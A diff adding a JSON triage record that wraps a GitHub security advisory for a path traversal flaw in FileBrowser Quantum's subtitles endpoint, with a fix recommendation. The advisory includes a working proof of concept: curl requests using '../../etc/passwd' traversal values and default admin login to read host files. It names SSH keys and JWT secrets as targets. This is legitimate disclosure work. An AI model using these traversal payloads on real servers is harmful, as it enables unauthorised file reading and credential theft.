@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/40743233?v=4\", \"events_url\": \"https://api.github.com/users/je-lv/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/je-lv/followers\", \"following_url\": \"https://api.github.com/users/je-lv/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/je-lv/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/je-lv\", \"id\": 40743233, \"login\": \"je-lv\", \"node_id\": \"MDQ6VXNlcjQwNzQzMjMz\", \"organizations_url\": \"https://api.github.com/users/je-lv/orgs\", \"received_events_url\": \"https://api.github.com/users/je-lv/received_events\", \"repos_url\": \"https://api.github.com/users/je-lv/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/je-lv/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/je-lv/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/je-lv\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54910\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-23\", \"name\": \"Relative Path Traversal\"}], \"description\": \"### Summary\\n\\nThe `subtitlesHandler` endpoint (`GET /api/media/subtitles`) accepts two user-controlled query parameters: `path` and `name`, both of which are used in filesystem operations without sanitization, creating two independent path traversal vectors.\\n\\nThe primary vector is the `path` parameter: it is passed directly to `idx.GetRealPath()` without calling `SanitizeUserPath()`, allowing an attacker to escape the storage root and set `parentDir` to any directory on the host. No existing anchor file is required. \\n\\nThe secondary vector is the `name` parameter: it is joined with `parentDir` via `filepath.Join(parentDir, name)` without stripping directory components, allowing traversal relative to any resolved `parentDir`.\\n\\nAny authenticated user (regardless of role or permissions) can exploit either vector to read any text file readable by the server process, including `/etc/passwd`, SSH keys, database credentials, and JWT signing keys.\\n\\n### Details\\n\\n**1. `path` parameter lacks `SanitizeUserPath()` — primary vector (`http/media.go:54`)**\\n\\n```go\\nuserscope, err := d.user.GetScopeForSourceName(source)\\n// ...\\nrealPath, _, err := idx.GetRealPath(userscope, path)  // path is raw user input, no sanitization\\n// ...\\nparentDir := filepath.Dir(realPath)  // line 59: attacker controls this directory\\n```\\n\\n`SanitizeUserPath()` explicitly rejects `..` segments:\\n\\n```go\\nfunc SanitizeUserPath(userPath string) (string, error) {\\n    // ...\\n    for _, segment := range segments {\\n        if segment == \\\"..\\\" {\\n            return \\\"\\\", fmt.Errorf(\\\"invalid path: path traversal detected\\\")\\n        }\\n    }\\n    // ...\\n}\\n```\\n\\nEvery other handler in the codebase calls `SanitizeUserPath()` before `GetRealPath()`. This handler skips it, so `path=../../etc/passwd` resolves `parentDir` to `/etc`, with no anchor file required.\\n\\n**2. `name` parameter used directly in `filepath.Join` — secondary vector (`http/media.go:63`)**\\n\\n```go\\nname := r.URL.Query().Get(\\\"name\\\")  // line 37 — raw user input\\n// ...\\ncontent, err = utils.GetSubtitleSidecarContent(\\n    filepath.Join(parentDir, name))  // line 63 — TRAVERSAL\\n```\\n\\n`filepath.Join(parentDir, \\\"../../etc/passwd\\\")` resolves the `..` components, escaping `parentDir`. This vector requires a valid file in scope as the `path` anchor.\\n\\n**3. `GetSubtitleSidecarContent` reads and returns file contents (`common/utils/media.go:17-43`)**\\n\\n```go\\nfunc GetSubtitleSidecarContent(subtitlePath string) (string, error) {\\n    info, err := os.Stat(subtitlePath)        // follows the traversed path\\n    // size check: < 50MB\\n    isText, err := IsTextFile(subtitlePath)   // checks UTF-8 validity\\n    content, err := os.ReadFile(subtitlePath) // reads and returns content\\n    return string(content), nil\\n}\\n```\\n\\nThe only constraint is that the target file must be UTF-8 valid and under 50MB. Binary files silently return an empty string.\\n\\n**4. Endpoint is behind `withUser` but requires no special permissions**\\n\\n```go\\n// httpRouter.go\\napi.HandleFunc(\\\"GET /media/subtitles\\\", withUser(subtitlesHandler))\\n```\\n\\nAny authenticated user can access this endpoint: no admin, modify, share, or download permission is required.\\n\\n### PoC\\n\\n**Vector 1: `path` traversal (no anchor file needed):**\\n\\n```bash\\ndocker run -d --name filebrowser-q-lab -p 18080:80 gtstef/filebrowser:latest && sleep 3\\nTOKEN=$(curl -s -X POST \\\"http://localhost:18080/api/auth/login?username=admin\\\" -H \\\"X-Password: admin\\\" | tr -d '\\\"')\\ncurl \\\"http://localhost:18080/api/media/subtitles?path=../../etc/passwd&source=srv&name=passwd&embedded=false&auth=$TOKEN\\\"\\n```\\n**Expected output:** `/etc/passwd` contents with HTTP 200.\\n\\n**Vector 2: `name` traversal (anchor file required):**\\n\\n```bash\\nmkdir -p /tmp/fbq-srv && echo \\\"dummy\\\" > /tmp/fbq-srv/poc.txt\\ndocker run -d --name filebrowser-q-lab2 -p 18081:80 -v /tmp/fbq-srv:/srv gtstef/filebrowser:latest && sleep 3\\nTOKEN=$(curl -s -X POST \\\"http://localhost:18081/api/auth/login?username=admin\\\" -H \\\"X-Password: admin\\\" | tr -d '\\\"')\\ncurl \\\"http://localhost:18081/api/media/subtitles?path=/poc.txt&source=srv&name=../../etc/passwd&embedded=false&auth=$TOKEN\\\"\\n```\\n**Expected output:** `/etc/passwd` contents with HTTP 200.\\n\\n### Impact\\n\\n- **Arbitrary file read**: Any authenticated user can read any text file on the host filesystem that the server process has read permission for.\\n- **No anchor file required**: The `path` vector works on a default install with an empty storage root, so no existing file in scope is needed.\\n- **Scope bypass**: Scoped users (restricted to a subdirectory) can escape their scope via either vector and access files belonging to other users or the host system.\\n- **Credential exposure**: `/etc/passwd`, `/etc/shadow` (if running as root), SSH private keys, application configuration files with database passwords, API keys, and JWT signing secrets.\\n- **Privilege escalation**: Reading the JWT signing key from the database or config file enables forging admin tokens.\\n- **No special permissions required**: The endpoint only requires basic authentication: no admin, modify, share, or download permissions.\\n\\n### Recommended Fix\\n\\nApply `SanitizeUserPath()` to the `path` parameter and `filepath.Base()` to the `name` parameter:\\n\\n```go\\n// http/media.go, subtitlesHandler\\n\\n// Sanitize path parameter (like all other handlers)\\npath, err := utils.SanitizeUserPath(path)\\nif err != nil {\\n    return http.StatusBadRequest, err\\n}\\n\\n// Strip directory components from name to prevent traversal\\nname = filepath.Base(name)\\n```\\n\\n`SanitizeUserPath()` rejects any `..` segment. `filepath.Base(\\\"../../etc/passwd\\\")` returns `\\\"passwd\\\"`, preventing traversal via `name`. Additionally, consider adding a file extension allowlist to restrict `name` to subtitle formats (`.srt`, `.vtt`, `.ass`, `.ssa`, `.sub`) only.\", \"epss\": {\"percentage\": 0.00307, \"percentile\": 0.22773}, \"ghsa_id\": \"GHSA-vvp7-h4fj-m28w\", \"github_reviewed_at\": \"2026-07-31T22:35:05Z\", \"html_url\": \"https://github.com/advisories/GHSA-vvp7-h4fj-m28w\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vvp7-h4fj-m28w\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54910\"}], \"nvd_published_at\": \"2026-07-20T15:16:43Z\", \"published_at\": \"2026-07-31T22:35:05Z\", \"references\": [\"https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-vvp7-h4fj-m28w\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-54910\", \"https://github.com/gtsteffaniak/filebrowser/pull/2524\", \"https://github.com/gtsteffaniak/filebrowser/commit/f3f4bbe80cb569d664174aea874d7bfa008c3b5a\", \"https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.4.3-beta\", \"https://github.com/advisories/GHSA-vvp7-h4fj-m28w\"], \"repository_advisory_url\": \"https://api.github.com/repos/gtsteffaniak/filebrowser/security-advisories/GHSA-vvp7-h4fj-m28w\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/gtsteffaniak/filebrowser\", \"summary\": \"FileBrowser Quantum's path traversal issue in subtitle handler allows any authenticated user to read arbitrary files\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-31T22:37:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-vvp7-h4fj-m28w\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260608182036-f3f4bbe80cb5\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/gtsteffaniak/filebrowser/backend\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260608182036-f3f4bbe80cb5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vvp7-h4fj-m28w",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/gtsteffaniak/filebrowser/backend: < 0.0.0-20260608182036-f3f4bbe80cb5"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-54910"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/gtsteffaniak/filebrowser/backend"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-01T19:31:54.997176Z",
+  "provenance": {
+    "content_sha256": "288f60e6868878c50bf3b84eb2cf5a7042b525aaad0b0b9f059fdd71553ba31d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-31T22:35:05Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vvp7-h4fj-m28w",
+  "status": "active",
+  "title": "FileBrowser Quantum's path traversal issue in subtitle handler allows any authenticated user to read arbitrary files",
+  "updated_at": "2026-07-31T22:37:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vvp7-h4fj-m28w"
+}
